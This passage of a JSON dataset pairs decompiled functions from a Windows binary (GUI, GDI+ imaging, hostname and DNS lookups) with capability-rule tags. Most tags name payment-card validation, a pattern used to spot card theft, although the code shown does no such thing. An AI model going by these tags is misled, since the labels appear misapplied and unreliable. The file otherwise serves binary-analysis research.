        "decompiled_code": "\nvoid __cdecl fcn.0045b924(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418438(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.00432198();\n    cVar1 = fcn.004322a0();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00425694(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.00432198();\n        fcn.004324e0();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.00425694();\n        fcn.00432198(uVar2);\n        fcn.0043235c(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "0045ba40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ba40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418438(&var_1ch, arg_8h);\n    fcn.00432198();\n    fcn.00432444();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.00425694();\n    fcn.00432198(uVar1);\n    fcn.0043235c(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 168
    },
    "0045c77c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c77c(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.00458568(uVar1, uVar2);\n    fcn.0045d5ac();\n    uVar1 = fcn.00458568();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.0045c8a4();\n    return;\n}\n",
        "token_count": 237
    },
    "0045ca20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045ca20(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.0045a9c8();\n        iVar1 = fcn.0045a528();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.0045a9c8();\n    }\n    fcn.0045c990(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 153
    },
    "0045ca70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ca70(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.00450124();\n        fcn.00450124();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 331
    },
    "0045cca4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cca4(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0045ad1c();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00418410();\n            iVar1 = fcn.0045b500();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0045ca70(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.0045caec(&stack0xfffffffc);\n        }\n        else {\n            fcn.0045cb6c(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0045cfc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cfc4(uint param_1, uint param_2)\n\n{\n    fcn.00403450(param_2, param_1);\n    return;\n}\n",
        "token_count": 42
    },
    "0045cff4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045cff4(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403450(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 102
    },
    "0045d310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d310(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x45d3f1;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.00405530();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.00450124();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.00450804();\n        fcn.00405584();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45d3f8;\n    uStack60 = 0x45d3f0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 503
    },
    "0045da50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045da50(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x45dbc8;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.0040af88(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x497c70 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.0040af88(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x497c72 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.004059dc();\n    *0x497c7c = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x497cb4 = fcn.00419aa0();\n    fcn.0045d658();\n    *0x497c5c = fcn.0045d404();\n    uVar1 = fcn.00443ac8();\n    **0x4927b4 = uVar1;\n    uVar1 = fcn.00444cd0();\n    **0x4925c4 = uVar1;\n    fcn.00446d0c();\n    fcn.00419250();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x45dc04);\n    if (iVar2 != 0) {\n        *0x49064c = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x45dc0c);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405530(0x45dbcf);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 619
    },
    "0045dc1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0045dc1c(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 181
    },
    "0045e3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045e3d4(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.00404704();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.00404704();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "0045e3a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e3a8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0045f4f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045f4f8(void)\n\n{\n    fcn.0045f554();\n    fcn.0045f69c();\n    return;\n}\n",
        "token_count": 37
    },
    "0045f51c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f51c(uint *param_1)\n\n{\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    fcn.0045eaa0();\n    fcn.0045eac4();\n    fcn.0045eb58();\n    *param_1 = uStack28;\n    param_1[1] = uStack24;\n    param_1[2] = uStack20;\n    param_1[3] = uStack16;\n    return;\n}\n",
        "token_count": 123
    },
    "0045f69c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0045f69c(void)\n\n{\n    uint8_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    \n    fcn.00405c6c();\n    pcVar1 = fcn.004059dc();\n    iVar2 = 0x10;\n    do {\n        *pcVar1 = \"0123456789abcdef\\x04\"[*in_EAX >> 4];\n        pcVar1[1] = \"0123456789abcdef\\x04\"[*in_EAX & 0xf];\n        pcVar1 = pcVar1 + 2;\n        in_EAX = in_EAX + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 168
    },
    "0045f980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f980(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45f995;\n    fcn.00407080();\n    uStack24 = 0x45f9d6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uVar1 = *(in_EAX + 4);\n    puStack20 = &stack0xfffffffc;\n    sub.gdiplus.dll_GdipSaveImageToStream(uVar1, in_EDX);\n    fcn.0045fa0c();\n    *in_FS_OFFSET = uVar1;\n    fcn.0040700c(0x45f9dd, arg_8h);\n    return;\n}\n",
        "token_count": 219
    },
    "0045fa18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045fa18(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromScan0(in_ECX, arg_ch, 0, arg_8h, 0, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045fa08();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 230
    },
    "0045fa78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045fa78(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromHBITMAP(in_ECX, arg_8h, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045fa08();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 218
    },
    "0045fad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045fad0(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    int32_t var_4h;\n    \n    if (param_2 != '\\0') {\n        var_4h = param_1;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    var_4h = 0;\n    if (param_1 != 0) {\n        uVar1 = sub.gdiplus.dll_GdipGetImageGraphicsContext(*(param_1 + 4), &var_4h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.0045fba8();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 247
    },
    "0045fd38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045fd38(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_ECX;\n    arg_8h_00 = fcn.0045f9e8();\n    uVar1 = fcn.0045fa18(arg_8h_00, uVar1);\n    fcn.0045fad0();\n    if (arg_8h == '\\x01') {\n        fcn.0045fb50();\n    }\n    else if (arg_8h == '\\x02') {\n        fcn.0045fb50();\n    }\n    else if (arg_8h == '\\x03') {\n        fcn.0045fb50();\n    }\n    iVar2 = fcn.0045fb6c(in_ECX, in_EDX, 0);\n    fcn.00404650();\n    fcn.00404650();\n    *in_EAX = uVar1;\n    return iVar2 == 0;\n}\n",
        "token_count": 265
    },
    "0045fde8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fde8(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x45fec8;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack96 = 0x45fe18;\n    var_8h = param_2;\n    var_ch = fcn.0045fa78(param_2);\n    uStack100 = 0x45feab;\n    iStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    fcn.0045fc54();\n    var_2ch = 1;\n    var_28h = **0x49239c;\n    uStack40 = (*0x49239c)[1];\n    uStack36 = (*0x49239c)[2];\n    uStack32 = (*0x49239c)[3];\n    var_14h = **0x492780;\n    var_18h = 1;\n    var_10h = &fcn.0045fde8::var_8h;\n    fcn.00420a60(0);\n    fcn.00407024();\n    arg_8h = &fcn.0045fde8::var_2ch;\n    fcn.0045f980(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    iStack104 = 0x45feb2;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 501
    },
    "0045feec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045feec(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x45ffb3;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x45ff20;\n    fcn.0045fa78(var_ch);\n    uStack68 = 0x45ff96;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.0045fd38(0);\n    fcn.0045fc54();\n    fcn.00420a60(0);\n    fcn.00407024();\n    uVar1 = 0;\n    fcn.0045f980(0);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x45ff9d);\n    return;\n}\n",
        "token_count": 298
    },
    "004602f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004602f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    *(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x31) = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    *(in_EAX + 0x3e) = 0;\n    *(in_EAX + 0x40) = 0xffffffff;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x5c) = 0;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x6c) = 0;\n    fcn.0040f480();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 416
    },
    "00460524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00460524(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004602f0();\n    *(in_EAX + 0x3c) = 2;\n    *(in_EAX + 0x3e) = 0;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "00460584": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460584(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4605a4;\n    fcn.004059cc();\n    puStack28 = 0x4605ac;\n    fcn.004059cc();\n    uStack32 = 0x460619;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *arg_8h = 2;\n    puStack28 = &stack0xfffffffc;\n    fcn.00460628();\n    uVar2 = fcn.004059dc();\n    uVar2 = sub.wsock32.dll_inet_addr(uVar2);\n    *(arg_8h + 2) = uVar2;\n    uVar2 = fcn.00460700();\n    uVar1 = sub.wsock32.dll_htons();\n    arg_8h[1] = uVar1;\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x460620;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 311
    },
    "00460628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "resolve DNS"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460628(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405530();\n    if (param_2 == NULL) {\n        fcn.00405584();\n    }\n    else if (*param_2 - 0x30U < 10) {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_inet_addr(uVar1);\n        if (iVar2 != -1) {\n            fcn.00405584();\n        }\n    }\n    else {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar2 != 0) {\n            fcn.0040af88(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0046073c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0046073c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack264 [256];\n    \n    fcn.00405530();\n    sub.wsock32.dll_gethostname(auStack264, 0x100);\n    iVar1 = (**(*in_EAX + 0x38))();\n    if (iVar1 == 0) {\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "004607d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004607d8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00460524();\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x88) = 0;\n    *(in_EAX + 0x8c) = 0;\n    *(in_EAX + 0x90) = 0;\n    *(in_EAX + 0x94) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "004619f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004619f4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_8h = 0;\n    puStack28 = 0x461a0f;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack32 = 0x461abb;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x461a8f;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h = &fcn.004619f4::var_8h;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040ef34(arg_8h, *0x461acc);\n    fcn.004055c8();\n    sub.user32.dll_ShowWindow();\n    sub.user32.dll_SetForegroundWindow();\n    iVar2 = 1;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.00461940();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = arg_8h;\n    iStack48 = 0x461ac2;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 414
    },
    "00461ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
